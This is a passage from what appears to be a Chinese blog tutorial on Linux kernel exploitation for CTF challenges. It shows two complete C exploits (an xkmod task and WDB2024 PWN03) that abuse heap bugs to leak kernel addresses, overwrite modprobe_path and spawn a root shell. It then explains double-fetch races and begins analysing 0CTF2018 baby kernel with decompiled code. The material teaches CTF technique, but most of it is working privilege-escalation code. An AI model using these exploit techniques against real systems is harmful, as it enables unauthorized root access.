class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6666666</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x7777777</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> xkmod_fd[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        xkmod_fd[i] = open(<span class="string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (xkmod_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] %d Failed to open xkmod.&quot;</span>, i);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span> =</span> &#123;<span class="built_in">malloc</span>(<span class="number">0x1000</span>), <span class="number">0</span>, <span class="number">0x50</span>&#125;;</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    close(xkmod_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    read_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    qword_dump(<span class="string">&quot;buf&quot;</span>, data.buf, <span class="number">0x50</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> page_offset_base = data.buf[<span class="number">0</span>] &amp; <span class="number">0xFFFFFFFFF0000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] page_offset_base: %p\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    data.buf[<span class="number">0</span>] = page_offset_base + <span class="number">0x9d000</span> - <span class="number">0x10</span>;</span><br><span class="line">    write_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    data.size = <span class="number">0x50</span>;</span><br><span class="line">    read_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    qword_dump(<span class="string">&quot;buf&quot;</span>, data.buf, <span class="number">0x50</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> kernel_offset = data.buf[<span class="number">2</span>] - <span class="number">0xffffffff81000030</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line"></span><br><span class="line">    close(xkmod_fd[<span class="number">1</span>]);</span><br><span class="line">    data.buf[<span class="number">0</span>] = modprobe_path - <span class="number">0x10</span>;</span><br><span class="line">    write_buf(xkmod_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;data.buf[<span class="number">2</span>], <span class="string">&quot;/home/shell.sh&quot;</span>);</span><br><span class="line">    write_buf(xkmod_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt;&gt; /home/shell.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;setsid cttyhack setuidgid 0 sh&#x27; &gt;&gt; /home/shell.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/shell.sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="WDB2024-PWN03"><a href="#WDB2024-PWN03" class="headerlink" title="WDB2024 PWN03"></a>WDB2024 PWN03</h2><h3 id="利用思路-28"><a href="#利用思路-28" class="headerlink" title="利用思路"></a>利用思路</h3><p>一道非常简单的内核题，基本上和<code>RWCTF2022 Digging into kernel 1 &amp; 2</code>是一样的，这道题大家拿去练手即可，建议大家自行分析题目，我只把我的<code>exp</code>贴在下面，但是建议大家自己写一个exp。</p>
<h3 id="exp-28"><a href="#exp-28" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xFFFFFFFF81E58B80</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_buf</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kmalloc %d\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x0</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_buf</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kfree\n&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_buf</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span>* buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] copy_to_user %d\n&quot;</span>, size);</span><br><span class="line">    read(fd, buf, size);</span><br><span class="line">    qword_dump(<span class="string">&quot;read_buf&quot;</span>, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_buf</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span>* buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] copy_from_user %d\n&quot;</span>, size);</span><br><span class="line">    qword_dump(<span class="string">&quot;write_buf&quot;</span>, buf, size);</span><br><span class="line">    write(fd, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="type">int</span> easy_fd;</span><br><span class="line">    easy_fd = open(<span class="string">&quot;/dev/easy&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    alloc_buf(easy_fd, <span class="number">0xa8</span>);</span><br><span class="line">    free_buf(easy_fd);</span><br><span class="line"></span><br><span class="line">    read_buf(easy_fd, buf, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> page_offset_base = buf[<span class="number">0</span>] &amp; <span class="number">0xFFFFFFFFF0000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] page_offset_base %p\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = page_offset_base + <span class="number">0x9d000</span> - <span class="number">0x10</span>;</span><br><span class="line">    write_buf(easy_fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    </span><br><span class="line">    alloc_buf(easy_fd, <span class="number">0xa8</span>);</span><br><span class="line">    alloc_buf(easy_fd, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">    read_buf(easy_fd, buf, <span class="number">0xa8</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> kernel_offset = buf[<span class="number">2</span>] - <span class="number">0xFFFFFFFF81000110</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = modprobe_path - <span class="number">0x20</span>;</span><br><span class="line">    alloc_buf(easy_fd, <span class="number">0xa8</span>);</span><br><span class="line">    free_buf(easy_fd);</span><br><span class="line"></span><br><span class="line">    write_buf(easy_fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    alloc_buf(easy_fd, <span class="number">0xa8</span>);</span><br><span class="line">    alloc_buf(easy_fd, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">    read_buf(easy_fd, buf, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;buf[<span class="number">4</span>], <span class="string">&quot;/tmp/shell.sh\x00&quot;</span>);</span><br><span class="line">    write_buf(easy_fd, buf, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt;&gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;setsid /bin/cttyhack setuidgid 0 /bin/sh&#x27; &gt;&gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /shell.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="内核条件竞争"><a href="#内核条件竞争" class="headerlink" title="内核条件竞争"></a>内核条件竞争</h1><p>通常情况下在用户态下的 pwn 当中我们只有一个独立运行的主线程，并不存在所谓条件竞争的情况，但在 kernel pwn 当中<strong>由攻击者负责编写用户态程序，可以很轻易地启动多个线程同时运行</strong>，从而轻易地产生条件竞争</p>
<h2 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h2><h3 id="利用思路-29"><a href="#利用思路-29" class="headerlink" title="利用思路"></a>利用思路</h3><p><code>double fetch</code> 直译就是 <code>取值两次</code>，直接理解就是在一次操作当中要<strong>两次（或是多次）重新获取某个对象的值</strong>，可能出现在下面这种情况当中：</p>
<ul>
<li>有一大段数据要从用户空间传给内核空间，但是直接传送整块数据会造成较大的开销，故选择<strong>只向内核传送一个指向用户地址空间的指针</strong></li>
<li>在后续的操作当中内核需要<strong>多次</strong>通过该指针获取到用户空间的数据</li>
</ul>
<p>一个典型的 Double Fetch  漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/pqLSVaINQ3zAsmO.png"
                      alt="pqLSVaINQ3zAsmO"
                ></p>
<p>不难看出，若是整个操作流程过长，则用户进程便有机会修改这一块数据，<strong>使得内核在两次访问这块空间时所获得的数据不一致，从而使得内核进入不同的执行流程</strong>，用户进程甚至可以<strong>直接开新的线程进行竞争来实现这个效果</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/GOSsNPkuMZHlUmT.png"
                      alt="GOSsNPkuMZHlUmT"
                ></p>
<p>通过在 <code>first fetch</code> 与 <code>second fetch</code> 之间的空挡修改数据从而改变内核执行流的利用手法便被称之为<code>double fetch</code>。</p>
<h3 id="0CTF2018-Final-baby-kernel"><a href="#0CTF2018-Final-baby-kernel" class="headerlink" title="0CTF2018 Final baby kernel"></a>0CTF2018 Final baby kernel</h3><h4 id="题目分析-8"><a href="#题目分析-8" class="headerlink" title="题目分析"></a>题目分析</h4><p><strong>start.sh</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M -smp 2,cores=2,threads=1 \</span><br><span class="line">    -kernel ./vmlinuz-4.15.0-22-generic \</span><br><span class="line">    -initrd ./core.cpio \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">    -cpu qemu64 \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -s</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>逆向分析</strong></p>
<p>其中参数 <code>0x6666</code> 可以获得 flag 在内核中的地址，参数 <code>0x1337</code> 则会将我们传入的 flag 与真正的 flag 进行对比，若正确则会将 flag 打印出来，并且题目没有禁用<code>dmesg</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">baby_ioctl</span><span class="params">(__int64 a1, attr *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  attr *v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp-5Ch] [rbp-5Ch]</span></span><br><span class="line">  attr *v5; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  v5 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6666</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x1337</span></span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               (__int64)v2, </span><br><span class="line">               <span class="number">0x10</span>LL, </span><br><span class="line">               *(_QWORD *)(__readgsqword((<span class="type">unsigned</span> <span class="type">int</span>)&amp;current_task) + <span class="number">0x1358</span>))</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               v5-&gt;flag_str,</span><br><span class="line">               SLODWORD(v5-&gt;flag_len),</span><br><span class="line">               *(_QWORD *)(__readgsqword((<span class="type">unsigned</span> <span class="type">int</span>)&amp;current_task) + <span class="number">0x1358</span>))</span><br><span class="line">         &amp;&amp; LODWORD(v5-&gt;flag_len) == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(v5-&gt;flag_str + i) != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x16</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xE</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简单分析可知我们应当传入如下结构体，其中 <code>flag_len</code> 参数与 <code>flag</code> 的长度对比，在 <code>.ko</code> 文件中 <code>flag</code> 的长度为 <code>33</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> attr            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, mappedto_3)</span><br><span class="line"><span class="number">00000000</span> flag_str        dq ?</span><br><span class="line"><span class="number">00000008</span> flag_len        dq ?</span><br><span class="line"><span class="number">00000010</span> attr            ends</span><br></pre></td></tr></table></figure></div>

<p>在 <code>0x1337</code> 功能当中还会通过 <code>_chk_range_not_ok()</code> 函数检查我们传入的地址范围是否合法，<code>add</code> 指令会影响 <code>CF</code>（产生进位&#x2F;借位）和 <code>OF</code>（两数最高位相同，结果最高位改变）标志位，v3获得的就是两数相加的 CF 位，这里一般为0（除非你传入 <code>0xffffffffffffffff</code> 附近的数），所以我们直接看另一个判断：range 是否小于 v4。</p>
<p><code>range</code> 为 <code>current_task</code> 的地址加上 <code>0x1358</code> 处所存地址，大概是 <code>task_struct-&gt;thread-&gt;fpu-&gt;state</code> 这个联合体内的某个位置上存的一个值，而 <code>v4</code> 则是我们传入的 <code>flag</code> 最后一个字节的地址，即我们传入的 <code>flag</code> 的地址不能够大于这个值且 <code>root</code> 调一下我们可以发现这个值为 <code>0x7ffffffff000</code>。这个位置刚好是用户地址空间的栈底，即我们传入的 <code>flag</code> 的地址不能为用户地址空间外的地址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall _chk_range_not_ok(__int64 flag_str, __int64 flag_len, <span class="type">unsigned</span> __int64 range)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  v3 = __CFADD__(flag_len, flag_str);</span><br><span class="line">  v4 = flag_len + flag_str;</span><br><span class="line">  <span class="keyword">return</span> v3 || range &lt; v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

